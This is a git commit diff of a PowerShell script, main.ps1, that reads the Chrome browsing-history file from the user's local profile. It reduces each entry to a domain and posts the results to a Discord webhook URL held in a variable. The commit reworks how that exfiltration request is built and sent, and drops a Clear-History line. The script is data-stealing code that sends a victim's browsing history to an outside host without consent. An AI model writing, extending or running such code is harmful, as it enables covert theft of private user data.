f509ffdee2ea7897734626c7fea78980960ca935
jwright420 <125150685+jwright420@users.noreply.github.com>
2023-06-17 16:02:09 -0400

    Update main.ps1

--- main.ps1
+++ main.ps1
@@ -2,14 +2,16 @@ $history = Get-Content -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\
 
 $decoded = 
 Foreach ($entry in $history){
-
 	Foreach($subentry in $entry){
+
 		$url = $entry
-		$domain = $url -replace 'http:\/\/','' -replace 'https:\/\/','' -replace '\/.*',''
-		Write-Host "Entry: " $domain
-		Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($domain | ConvertTo-Json)
+			
+		$cleanUrl = $url -replace 'http:\/\/','' -replace 'https:\/\/','' -replace '\/.*','' -replace '[^\p{L}\p{Nd}]', ''
+		$domain = @{
+			'domain' = $cleanUrl
+		}
+		
 	}
+	Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($domain | ConvertTo-Json) -Verbose
+	#Write-Host ($domain)
 }
-
-
-Clear-History
